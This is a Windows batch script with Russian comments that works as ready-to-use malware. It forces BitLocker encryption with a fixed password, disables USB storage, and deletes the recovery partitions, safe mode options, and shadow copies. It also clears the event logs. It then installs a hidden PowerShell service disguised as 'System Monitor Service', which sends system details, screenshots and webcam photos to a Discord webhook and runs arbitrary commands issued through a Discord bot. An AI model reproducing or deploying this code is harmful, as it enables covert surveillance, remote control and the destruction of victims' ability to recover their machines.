@echo off
chcp 65001 >nul
title Lockdown - %COMPUTERNAME%
setlocal enabledelayedexpansion

net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [!] Запусти от Администратора!
    echo     ПКМ по файлу -> Запустить от имени администратора
    pause
    exit /b
)

:: ============================================================
:: НАСТРОЙКИ
:: ============================================================
set PASS=174885
set WEBHOOK_MAIN=https://discord.com/api/webhooks/ТВОЙ_ID/ТВОЙ_ТОКЕН
set WEBHOOK_BACKUP=https://discord.com/api/webhooks/ЗАПАСНОЙ_ID/ЗАПАСНОЙ_ТОКЕН
set CHANNEL_ID=ТВОЙ_ID_КАНАЛА
set BOT_TOKEN=ТВОЙ_ТОКЕН_БОТА

:: Проверка настроек
if "%WEBHOOK_MAIN%"=="https://discord.com/api/webhooks/ТВОЙ_ID/ТВОЙ_ТОКЕН" (
    echo [!!!] НАСТРОЙКИ НЕ ЗАПОЛНЕНЫ!
    echo [!!!] Открой скрипт и вставь свои данные
    pause
    exit /b
)

:: ============================================================
:: ПРОВЕРКА СИСТЕМЫ
:: ============================================================
for /f "tokens=2 delims=[]" %%a in ('ver') do set WINVER=%%a
for /f "tokens=2 delims=. " %%a in ('echo %WINVER%') do set WIN_MAJOR=%%a

if %WIN_MAJOR% LSS 10 (
    echo [!] Требуется Windows 10 или новее!
    pause
    exit /b
)

wmic os get Caption | findstr /i "Home" >nul
if %errorLevel% equ 0 (set EDITION=HOME) else (set EDITION=PRO)

:: ============================================================
:: СБОР ИНФОРМАЦИИ
:: ============================================================
set PCNAME=%COMPUTERNAME%
set MANUFACTURER=UNKNOWN
wmic computersystem get manufacturer | findstr /i "Dell" >nul && set MANUFACTURER=DELL
wmic computersystem get manufacturer | findstr /i "HP" >nul && set MANUFACTURER=HP
wmic computersystem get manufacturer | findstr /i "Lenovo" >nul && set MANUFACTURER=LENOVO
wmic computersystem get manufacturer | findstr /i "ASUS" >nul && set MANUFACTURER=ASUS
wmic computersystem get manufacturer | findstr /i "Acer" >nul && set MANUFACTURER=ACER
wmic computersystem get manufacturer | findstr /i "MSI" >nul && set MANUFACTURER=MSI
wmic computersystem get manufacturer | findstr /i "Gigabyte" >nul && set MANUFACTURER=GIGABYTE

for /f "tokens=*" %%a in ('wmic computersystem get model ^| findstr /v "^$" ^| findstr /v "Model"') do set MODEL=%%a
for /f "tokens=*" %%a in ('wmic bios get serialnumber ^| findstr /v "^$" ^| findstr /v "SerialNumber"') do set SERIAL=%%a
for /f "tokens=*" %%a in ('wmic os get Caption ^| findstr /v "^$" ^| findstr /v "Caption"') do set OS=%%a
for /f "tokens=*" %%a in ('wmic cpu get Name ^| findstr /v "^$" ^| findstr /v "Name"') do set CPU=%%a
for /f "tokens=*" %%a in ('wmic computersystem get TotalPhysicalMemory ^| findstr /v "^$" ^| findstr /v "TotalPhysicalMemory"') do set /a RAM=%%a/1073741824
for /f "tokens=*" %%a in ('getmac /fo table /nh ^| findstr /v "N/A" ^| findstr /v "^$"') do set MAC=%%a

set MODEL=%MODEL: =%
set SERIAL=%SERIAL: =%
set MAC=%MAC:~0,17%
if "%MODEL%"=="" set MODEL=Unknown
if "%SERIAL%"=="" set SERIAL=Unknown

echo [!] %PCNAME% | %MANUFACTURER% | %MODEL% | %EDITION%
echo.

:: ============================================================
:: 1. BITLOCKER
:: ============================================================
echo [1/7] BitLocker...
if "%EDITION%"=="HOME" (
    manage-bde -on C: -used -recoverypassword >nul 2>&1
) else (
    reg add "HKLM\SOFTWARE\Policies\Microsoft\FVE" /v "EnableBDEWithNoTPM" /t REG_DWORD /d 1 /f >nul 2>&1
    reg add "HKLM\SOFTWARE\Policies\Microsoft\FVE" /v "UsePasswordNoTPM" /t REG_DWORD /d 1 /f >nul 2>&1
    manage-bde -protectors -add C: -password -pw %PASS% >nul 2>&1
    manage-bde -protectors -add C: -recoverypassword >nul 2>&1
    manage-bde -on C: -used >nul 2>&1
)
manage-bde -protectors -get C: > "C:\BitLocker_Key.txt" 2>&1
attrib +s +h "C:\BitLocker_Key.txt"
echo [OK]

:: ============================================================
:: 2. USB
:: ============================================================
echo [2/7] USB...
reg add "HKLM\SYSTEM\CurrentControlSet\Services\USBSTOR" /v "Start" /t REG_DWORD /d 4 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\UASPStor" /v "Start" /t REG_DWORD /d 4 /f >nul 2>&1
echo [OK]

:: ============================================================
:: 3. RECOVERY
:: ============================================================
echo [3/7] Recovery...
reagentc /disable >nul 2>&1
if exist "C:\Recovery" (takeown /f "C:\Recovery" /r /d y >nul 2>&1 && icacls "C:\Recovery" /grant Everyone:F /t >nul 2>&1 && rd /s /q "C:\Recovery" >nul 2>&1)
if exist "C:\Windows\System32\Recovery" (takeown /f "C:\Windows\System32\Recovery" /r /d y >nul 2>&1 && icacls "C:\Windows\System32\Recovery" /grant Everyone:F /t >nul 2>&1 && rd /s /q "C:\Windows\System32\Recovery" >nul 2>&1)
echo [OK]

:: ============================================================
:: 4. SAFE MODE
:: ============================================================
echo [4/7] Safe Mode...
bcdedit /set {current} recoveryenabled No >nul 2>&1
bcdedit /set {current} bootstatuspolicy ignoreallfailures >nul 2>&1
bcdedit /set {globalsettings} advancedoptions false >nul 2>&1
echo [OK]

:: ============================================================
:: 5. RESTORE POINTS
:: ============================================================
echo [5/7] Restore Points...
vssadmin delete shadows /all /quiet >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /t REG_DWORD /d 1 /f >nul 2>&1
echo [OK]

:: ============================================================
:: 6. ОЧИСТКА ЛОГОВ
:: ============================================================
echo [6/7] Clear Logs...
powershell -WindowStyle Hidden -Command "wevtutil cl 'Windows PowerShell' 2>$null; wevtutil cl Security 2>$null; wevtutil cl System 2>$null" >nul 2>&1
del /f /q "%TEMP%\*" >nul 2>&1
echo [OK]

:: ============================================================
:: 7. СЛУЖБА (БЕЗ КОНФЛИКТОВ)
:: ============================================================
echo [7/7] Service...

mkdir "C:\Windows\System32\SysMonitor" >nul 2>&1
attrib +s +h "C:\Windows\System32\SysMonitor"

powershell -WindowStyle Hidden -Command "
[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('%PASS%')) | Out-File 'C:\Windows\System32\SysMonitor\.cfg' -NoNewline

`$code = @'
Add-Type -AssemblyName System.Windows.Forms,System.Drawing

`$webhook_main='%WEBHOOK_MAIN%'
`$webhook_backup='%WEBHOOK_BACKUP%'
`$channelId='%CHANNEL_ID%'
`$botToken='%BOT_TOKEN%'
`$pc='%PCNAME%'
`$man='%MANUFACTURER%'
`$mod='%MODEL%'
`$sn='%SERIAL%'
`$os='%OS%'
`$cpu='%CPU%'
`$ram='%RAM%'
`$mac='%MAC%'
`$lastMsgId=`$null
`$lastReg=Get-Date
`$lastScreen=Get-Date
`$webhook=`$webhook_main

function Switch-Webhook { `$script:webhook = if (`$webhook -eq `$webhook_main) { `$webhook_backup } else { `$webhook_main } }

function Send-Discord([string]`$m) {
    foreach (`$i in 0..1) {
        try { 
            `$b=@{content=`$m}|ConvertTo-Json -Depth 3
            Invoke-RestMethod -Uri `$webhook -Method Post -Body `$b -ContentType 'application/json' -TimeoutSec 10|Out-Null
            return 
        } catch { Switch-Webhook }
    }
}

function Send-File([string]`$p,[string]`$n) {
    foreach (`$i in 0..1) {
        try {
            `$bn=[System.Guid]::NewGuid().ToString()
            `$fb=[System.IO.File]::ReadAllBytes(`$p)
            `$fe=[System.Text.Encoding]::GetEncoding('iso-8859-1').GetString(`$fb)
            `$bd=\"--{0}`r`nContent-Disposition: form-data; name=`\"file`\"; filename=`\"`$n`\"`r`nContent-Type: application/octet-stream`r`n`r`n{1}`r`n--{0}--\" -f `$bn,`$fe
            Invoke-RestMethod -Uri `$webhook -Method Post -Body `$bd -ContentType \"multipart/form-data; boundary=`$bn\" -TimeoutSec 30|Out-Null
            return
        } catch { Switch-Webhook }
    }
}

function Get-Screenshot {
    try {
        `$sc=[System.Windows.Forms.Screen]::PrimaryScreen
        `$bm=New-Object System.Drawing.Bitmap(`$sc.Bounds.Width,`$sc.Bounds.Height)
        `$g=[System.Drawing.Graphics]::FromImage(`$bm)
        `$g.CopyFromScreen(`$sc.Bounds.X,`$sc.Bounds.Y,0,0,`$sc.Bounds.Size)
        `$p=[System.IO.Path]::GetTempPath()+'sc_'+[DateTime]::Now.ToString('HHmmss')+'.png'
        `$bm.Save(`$p,[System.Drawing.Imaging.ImageFormat]::Png)
        `$g.Dispose();`$bm.Dispose()
        return `$p
    } catch { return `$null }
}

function Get-Camera {
    try {
        `$cam=New-Object -ComObject WScript.Shell
        `$cam.Run('microsoft.windows.camera:',1)
        Start-Sleep -Seconds 3
        `$cam.SendKeys('%%(F4)')
        Start-Sleep -Seconds 2
        `$cf=[Environment]::GetFolderPath('MyPictures')+'\Camera Roll'
        if(Test-Path `$cf){
            `$latest=Get-ChildItem `$cf -Filter *.jpg|Sort-Object LastWriteTime -Descending|Select-Object -First 1
            if(`$latest){
                `$dest=[System.IO.Path]::GetTempPath()+'cam_'+[DateTime]::Now.ToString('HHmmss')+'.jpg'
                Copy-Item `$latest.FullName `$dest -Force
                return `$dest
            }
        }
        return `$null
    } catch { return `$null }
}

function Get-IP {
    try {
        `$e=(Invoke-RestMethod -Uri 'https://api.ipify.org' -TimeoutSec 5)
        `$l=(Get-NetIPAddress -AddressFamily IPv4|Where-Object{`$_.InterfaceAlias -notmatch 'Loopback'}|Select-Object -First 1).IPAddress
        return @{E=`$e;L=`$l}
    } catch { return @{E='N/A';L='N/A'} }
}

function Register-PC {
    `$ip=Get-IP
    `$emb=@{
        title=\"🟢 `$pc В СЕТИ\"
        color=65280
        fields=@(
            @{name='🏭 Производитель';value=`$man;inline=`$true},
            @{name='📦 Модель';value=`$mod;inline=`$true},
            @{name='🔢 Серийный';value=`$sn;inline=`$true},
            @{name='💻 ОС';value=`$os;inline=`$true},
            @{name='⚙️ CPU';value=`$cpu.Substring(0,[Math]::Min(40,`$cpu.Length));inline=`$true},
            @{name='🧠 RAM';value=\"`$ram GB\";inline=`$true},
            @{name='🌐 IP';value=`$ip.E;inline=`$true},
            @{name='🏠 Локальный';value=`$ip.L;inline=`$true}
        )
        footer=@{text=\"`$man `$mod | `$sn\"}
        timestamp=(Get-Date -Format 'o')
    }
    try {
        `$b=@{embeds=@(`$emb)}|ConvertTo-Json -Depth 10
        Invoke-RestMethod -Uri `$webhook -Method Post -Body `$b -ContentType 'application/json' -TimeoutSec 10|Out-Null
    } catch {}
}

function Get-Commands {
    try {
        `$h=@{Authorization=\"Bot `$botToken\"}
        if(`$script:lastMsgId){
            `$u=\"https://discord.com/api/v10/channels/`$channelId/messages?after=`$script:lastMsgId&limit=3\"
        } else {
            `$u=\"https://discord.com/api/v10/channels/`$channelId/messages?limit=1\"
        }
        `$ms=Invoke-RestMethod -Uri `$u -Headers `$h -Method Get -TimeoutSec 10
        
        if(`$ms.Count -gt 0){
            `$script:lastMsgId=`$ms[0].id
            foreach(`$m in `$ms){
                if(`$m.author.bot){continue}
                `$t=`$m.content.ToLower()
                
                # !list
                if(`$t -eq '!list'){
                    try {
                        `$h2=@{Authorization=\"Bot `$botToken\"}
                        `$all=Invoke-RestMethod -Uri \"https://discord.com/api/v10/channels/`$channelId/messages?limit=100\" -Headers `$h2 -Method Get -TimeoutSec 10
                        `$pcs=@{}
                        `$cut=(Get-Date).AddHours(-1)
                        foreach(`$msg in `$all){
                            if(`$msg.embeds -and `$msg.embeds[0].title -match 'В СЕТИ'){
                                `$n=`$matches[1] -replace '🟢 ',''
                                `$tm=[DateTime]::Parse(`$msg.timestamp)
                                if(`$tm -gt `$cut -and -not `$pcs.ContainsKey(`$n)){`$pcs[`$n]=`$tm}
                            }
                        }
                        if(`$pcs.Count -gt 0){
                            `$lst=\"**🖥 ПК (`$(`$pcs.Count) шт.):**\n\"
                            `$i=1
                            foreach(`$k in (`$pcs.Keys|Sort-Object)){
                                `$lst+=\"`$i. **`$k** (`$(`$pcs[`$k].ToString('HH:mm'))`)\n\"
                                `$i++
                            }
                            Send-Discord `$lst
                        } else {
                            Send-Discord '❌ Нет активных ПК'
                        }
                    } catch {}
                }
                
                # !count
                elseif(`$t -eq '!count'){
                    try {
                        `$h2=@{Authorization=\"Bot `$botToken\"}
                        `$all=Invoke-RestMethod -Uri \"https://discord.com/api/v10/channels/`$channelId/messages?limit=100\" -Headers `$h2 -Method Get -TimeoutSec 10
                        `$cnt=0
                        `$cut=(Get-Date).AddHours(-1)
                        foreach(`$msg in `$all){
                            if(`$msg.embeds -and `$msg.embeds[0].title -match 'В СЕТИ'){
                                `$tm=[DateTime]::Parse(`$msg.timestamp)
                                if(`$tm -gt `$cut){`$cnt++}
                            }
                        }
                        Send-Discord \"📊 **ПК онлайн: `$cnt**\"
                    } catch {}
                }
                
                # !screen
                elseif(`$t -eq '!screen'){
                    `$p=Get-Screenshot
                    if(`$p){
                        Send-Discord \"📸 **`$pc**\"
                        Send-File `$p \"`$pc.png\"
                        Remove-Item `$p -Force
                    }
                }
                
                # !cam
                elseif(`$t -eq '!cam'){
                    `$p=Get-Camera
                    if(`$p){
                        Send-Discord \"📹 **`$pc**\"
                        Send-File `$p \"`$pc-cam.jpg\"
                        Remove-Item `$p -Force
                    } else {
                        Send-Discord '❌ Камера не найдена'
                    }
                }
                
                # !info
                elseif(`$t -eq '!info'){
                    `$ip=Get-IP
                    Send-Discord \"**📊 `$pc**\n🏭 `$man\n📦 `$mod\n🔢 `$sn\n💻 `$os\n⚙️ `$cpu.Substring(0,[Math]::Min(40,`$cpu.Length))\n🧠 `$ram GB\n🌐 `$ip.E\n🏠 `$ip.L\"
                }
                
                # !cmd КОМАНДА
                elseif(`$t -match '^!cmd (.+)'){
                    `$cmd=`$matches[1]
                    `$result=cmd /c \"`$cmd 2>&1\"
                    if(`$result.Length -gt 1900){`$result=`$result.Substring(0,1900)+'...'}
                    Send-Discord \"`$pc`: \`\`\`\n`$result\n\`\`\`\"
                }
                
                # !lock
                elseif(`$t -eq '!lock'){
                    rundll32.exe user32.dll,LockWorkStation
                    Send-Discord \"🔒 **`$pc** заблокирован\"
                }
                
                # !shutdown
                elseif(`$t -eq '!shutdown'){
                    Send-Discord \"⚠️ **`$pc** выключается...\"
                    shutdown /s /t 10 /c \"Remote Shutdown\"
                }
                
                # !reboot
                elseif(`$t -eq '!reboot'){
                    Send-Discord \"🔄 **`$pc** перезагружается...\"
                    shutdown /r /t 10 /c \"Remote Reboot\"
                }
                
                # !help
                elseif(`$t -eq '!help'){
                    Send-Discord \"**📋 КОМАНДЫ:**\n!list - список ПК\n!count - количество\n!screen - скриншот\n!cam - фото с камеры\n!info - информация\n!cmd КОМАНДА - выполнить\n!lock - заблокировать\n!shutdown - выключить\n!reboot - перезагрузить\n!help - справка\"
                }
            }
        }
    } catch {}
}

# Запуск
Register-PC

# Главный цикл
while(`$true){
    try {
        Get-Commands
        
        # Перерегистрация каждые 30 мин
        if(((Get-Date)-`$lastReg).TotalMinutes -ge 30){
            Register-PC
            `$lastReg=Get-Date
        }
        
        # Автоскриншот каждые 30 мин
        if(((Get-Date)-`$lastScreen).TotalMinutes -ge 30){
            `$p=Get-Screenshot
            if(`$p){
                Send-File `$p \"`$pc-auto.png\"
                Remove-Item `$p -Force
            }
            `$lastScreen=Get-Date
        }
        
        Start-Sleep -Seconds 15
    } catch {
        Start-Sleep -Seconds 30
    }
}
'@
`$code | Out-File -FilePath 'C:\Windows\System32\SysMonitor\service.ps1' -Encoding UTF8
" >nul 2>&1

sc stop SysMonitor >nul 2>&1
sc delete SysMonitor >nul 2>&1
sc create SysMonitor binPath= "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\System32\SysMonitor\service.ps1" start= auto DisplayName= "System Monitor Service" >nul 2>&1
sc description SysMonitor "Отслеживает системные события и производительность" >nul 2>&1
sc failure SysMonitor reset= 86400 actions= restart/1000/restart/1000/restart/1000 >nul 2>&1
sc start SysMonitor >nul 2>&1
echo [OK]

echo.
echo ╔══════════════════════════════════════╗
echo ║  ✅ %PCNAME% ГОТОВ!                 ║
echo ║  Пароль: %PASS%                     ║
echo ║  Перезагрузка через 30 сек...       ║
echo ╚══════════════════════════════════════╝

shutdown /r /t 30 /c "Lockdown Complete"
pause
